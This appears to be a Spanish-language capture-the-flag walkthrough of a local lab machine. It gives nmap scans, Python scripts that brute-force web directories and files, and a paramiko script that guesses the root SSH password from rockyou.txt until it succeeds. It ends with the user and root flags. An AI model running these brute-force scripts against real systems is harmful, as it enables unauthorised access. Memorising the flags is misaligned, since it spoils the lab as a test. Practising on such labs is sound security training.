Buscamos puertos tcp activos.

sudo nmap -sS -sV -O -p- 192.168.56.102 -oN tcp                                                                                                               
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-05 15:24 -05
Nmap scan report for 192.168.56.102
Host is up (0.00075s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    nginx
MAC Address: 08:00:27:E5:E3:8F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop


Buscamos puertos Udp activos

sudo nmap -sUV -T4 -F --version-intensity 0 192.168.56.102 -oN udp                                                                                  
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-05 15:27 -05
Nmap scan report for 192.168.56.102
Host is up (0.00067s latency).
All 100 scanned ports on 192.168.56.102 are in ignored states.
Not shown: 59 open|filtered udp ports (no-response), 41 closed udp ports (port-unreach)
MAC Address: 08:00:27:E5:E3:8F (Oracle VirtualBox virtual NIC)


Tenemos los puertos 22 y 80 activos.

Usamos Curl...
curl -v http://192.168.56.

* Trying 192.168.56.102:80...
* Connected to 192.168.56.102 (192.168.56.102) port 80 (#0)
> GET / HTTP/1.1
> Host: 192.168.56.102
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx
< Date: Mon, 05 Dec 2022 20:30:15 GMT
< Content-Type: text/html
< Content-Length: 57
< Last-Modified: Sun, 20 Sep 2020 16:29:39 GMT
< Connection: keep-alive
< ETag: "5f678373-39"
< Accept-Ranges: bytes
< 

Dont Overthink. Really, Its simple.
        <!-- Trust me -->

El Html nos dice poco excepto que no sobre-pensemos la solución.

Buscamos directorios mediante fuerza bruta con Python y requests.

```python
import requests

ip = 'http://192.168.56.102/'
payload = '/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt'

with open(payload, 'r') as file:
    for string in file:
        url = ip + string[:-1]
        if "#" in url:
            continue
        response = requests.get(url)
        if response.status_code == 200:
            print(f'[+] {url}  status-code [{response.status_code}]')
```
Salida:
[+] http://192.168.56.102/  status-code [200]

No encontramos ningún directorio sospechoso y procedemos a buscar archivos mediante el uso de la misma tecnica.
```python
import requests

ip = 'http://192.168.56.102/'
payload = '/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt'

with open(payload, 'r') as file:
    for string in file:
        list = ['.html', '.txt', '.php', '.bak', '.jpeg', '.zip', '.sql'] # Extensiones que buscara.
        for item in list:
            url = ip + string[:-1] + item
            if "#" in url:
                continue
            response = requests.get(url)
            if response.status_code == 200:
                print(f'[+] {url}  status-code [{response.status_code}]')
```
Salida:
[+] http://192.168.56.102/index.html  status-code [200]

Solo encontramos un archivo.


Pasamos a revisar SSH tratando de conectar como 'root' usando paramiko y rockyou.txt
```python
import paramiko

server = '192.168.56.102'
username = 'root'
file = '/home/../../rockyou.txt'

with open(file, 'r') as payloads:
    for payload in payloads:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(server, username=username, password=payload[:-1])
            print(f'[+] {username}: {payload}')
            ssh.close()
            break
        except paramiko.ssh_exception.AuthenticationException as err:
            print(f'[-] {username}: {payload[:-1]}')
            ssh.close()
```
Salida:
.
.
.
.
[-] root: fernanda
[-] root: westlife
[-] root: blondie
[-] root: sasuke
[-] root: smiley
[-] root: jackson
[+] root: simple

El password es 'simple' para el usuario 'root'

id:uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) 
Flag user:HMV665sXzDS
Flag root:HMVtyr543FG
